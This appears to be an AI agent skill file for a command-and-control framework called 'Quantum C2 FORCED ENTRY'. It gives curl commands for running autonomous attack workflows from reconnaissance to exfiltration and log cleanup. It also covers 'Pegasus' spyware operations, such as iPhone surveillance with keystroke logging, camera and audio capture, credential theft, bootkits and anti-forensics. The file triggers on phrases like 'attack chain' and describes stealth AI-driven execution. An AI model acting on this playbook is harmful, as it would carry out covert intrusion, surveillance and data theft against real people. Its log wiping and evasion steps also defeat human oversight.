---
name: quantum-c2-forced-entry
description: >
  Full lifecycle exploitation operations for Quantum C2 FORCED ENTRY module. Use when the user wants to run complete exploitation workflows from reconnaissance to exfiltration, manage Pegasus operations, execute autonomous AI-driven operations, or generate operational reports. Triggers on: "forced entry", "full lifecycle", "pegasus", "autonomous exploitation", "operation workflow", "run exploit chain", "AI-driven operation", "exploitation lifecycle", "operational report", "attack chain".
---

# Quantum C2 FORCED ENTRY — Full Lifecycle Skill

Execute complete exploitation lifecycles with AI-driven autonomy.

## Exploitation Workflows

### List Workflows
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/forced-entry/workflows
```

### Seed Workflows
```bash
curl -X POST http://localhost:8000/api/forced-entry/workflows/seed \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Execute Workflow
```bash
curl -X POST "http://localhost:8000/api/forced-entry/workflows/{id}/execute?target=192.168.1.0/24" \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Check Status
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/forced-entry/workflows/{id}/status
```

### Built-in Workflows

| Workflow | Phases | Use Case |
|----------|--------|----------|
| **Full Lifecycle** | 9 | Complete recon-to-exfil |
| **Quick Access** | 4 | Time-critical operations |
| **Advanced Persistence** | 7 | Deep implant deployment |
| **Data Exfiltration** | 5 | Targeted data theft |

## Full Lifecycle Phases

```
1. Reconnaissance ──► nmap, OS fingerprint, service enum
2. Weaponization ──► Exploit selection, payload generation
3. Delivery ────────► Payload delivery, vector selection
4. Exploitation ────► Exploit execution, access confirmation
5. Installation ────► Persistence setup, backdoor install
6. C2 ──────────────► C2 establishment, beacon config
7. Actions ─────────► Lateral movement, priv esc, data access
8. Exfiltration ────► Data staging, transfer channel
9. Cleanup ─────────► Log cleanup, artifact removal
```

## Pegasus Operations

### List Operations
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/forced-entry/pegasus/operations
```

### Seed Operations
```bash
curl -X POST http://localhost:8000/api/forced-entry/pegasus/operations/seed \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Create Operation
```bash
curl -X POST http://localhost:8000/api/forced-entry/pegasus/operations \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Operation Nightingale",
    "target": "192.168.1.100",
    "objective": "iPhone surveillance via iMessage",
    "modules": ["keystroke_logging", "screen_capture", "location_tracking", "message_sync", "credential_theft"]
  }'
```

### Start Operation
```bash
curl -X POST http://localhost:8000/api/forced-entry/pegasus/operations/{id}/start \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Execute Module
```bash
curl -X POST http://localhost:8000/api/forced-entry/pegasus/operations/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"module_id": "keystroke_logging", "parameters": {}}'
```

### Complete Operation
```bash
curl -X POST http://localhost:8000/api/forced-entry/pegasus/operations/{id}/complete \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Pegasus Module Catalog

### Information Collection (12 modules)
| Module | Platform | Description |
|--------|----------|-------------|
| `keystroke_logging` | iOS/Android/Win/Mac | Captures all keystrokes |
| `screen_capture` | iOS/Android/Win/Mac | Periodic screenshots |
| `audio_monitoring` | iOS/Android | Background audio recording |
| `camera_capture` | iOS/Android | Remote camera activation |
| `contact_sync` | iOS/Android/Win | Exfiltrate contacts |
| `message_sync` | iOS/Android | Sync all messaging apps |
| `location_tracking` | All | GPS + cellular triangulation |
| `call_log_sync` | iOS/Android | Call history extraction |
| `email_sync` | All | Email interception |
| `file_sync` | All | Selective file exfiltration |
| `cloud_sync` | All | iCloud/Google Drive sync |
| `app_data_sync` | All | App data extraction |

### Remote Control (5 modules)
| Module | Description |
|--------|-------------|
| `remote_control` | Full remote control interface |
| `command_execution` | Execute arbitrary commands |
| `file_management` | Upload/download files |
| `app_management` | Install/remove apps |
| `settings_manipulation` | Modify system settings |

### Exploitation (8 modules)
| Module | Description |
|--------|-------------|
| `zero_day_exploit` | Deploy zero-click exploits |
| `cve_exploit` | Exploit known vulnerabilities |
| `social_engineering` | Phishing/pretexting campaigns |
| `website_clone` | Credential harvesting clones |
| `qr_code_attack` | Malicious QR codes |
| `location_spoofing` | GPS spoofing |
| `sms_interception` | SMS interception |
| `call_interception` | Call interception |

### Persistence (5 modules)
| Module | Description |
|--------|-------------|
| `persistence_mechanism` | Multiple persistence vectors |
| `bootkit` | Bootloader modification |
| `firmware_backdoor` | Firmware embed |
| `credential_theft` | Credential extraction |
| `keychain_access` | Keychain/Keystore access |

### Evasion (4 modules)
| Module | Description |
|--------|-------------|
| `anti_forensics` | Counter-forensic techniques |
| `data_encryption` | Quantum-resistant encryption |
| `log_manipulation` | Log modification/deletion |
| `timeline_manipulation` | Event timeline alteration |

## AI-Driven Execution

### Full Lifecycle with AI
```bash
# Use AI to drive the entire operation
curl -X POST http://localhost:8000/api/forced-entry/workflows/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "192.168.1.0/24",
    "ai_model": "agnes-pro",
    "stealth_mode": true,
    "auto_evasion": true
  }'
```

## Operations Report

### Generate Report
```bash
curl -X POST http://localhost:8000/api/forced-entry/analytics/summary \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Export Report
```bash
# Returns JSON with all operational data
curl -s -H "Authorization: Bearer $C2_TOKEN" \
  http://localhost:8000/api/forced-entry/analytics/summary \
  | python -m json.tool > forced-entry-report.json
```

## Complete Operation Example

```bash
# 1. Seed everything
curl -s -X POST http://localhost:8000/api/forced-entry/deception/assets/seed \
  -H "Authorization: Bearer $C2_TOKEN"
curl -s -X POST http://localhost:8000/api/forced-entry/triggers/seed \
  -H "Authorization: Bearer $C2_TOKEN"
curl -s -X POST http://localhost:8000/api/forced-entry/workflows/seed \
  -H "Authorization: Bearer $C2_TOKEN"

# 2. Run full lifecycle workflow
WORKFLOW_ID=$(curl -s -H "Authorization: Bearer $C2_TOKEN" \
  http://localhost:8000/api/forced-entry/workflows | python -c "import sys,json; print(json.load(sys.stdin)['workflows'][0]['id'])")

curl -s -X POST "http://localhost:8000/api/forced-entry/workflows/$WORKFLOW_ID/execute?target=192.168.1.0/24" \
  -H "Authorization: Bearer $C2_TOKEN"

# 3. Monitor
curl -s -H "Authorization: Bearer $C2_TOKEN" \
  "http://localhost:8000/api/forced-entry/workflows/$WORKFLOW_ID/status"

# 4. Generate report
curl -s -X POST http://localhost:8000/api/forced-entry/analytics/summary \
  -H "Authorization: Bearer $C2_TOKEN" | python -m json.tool
```
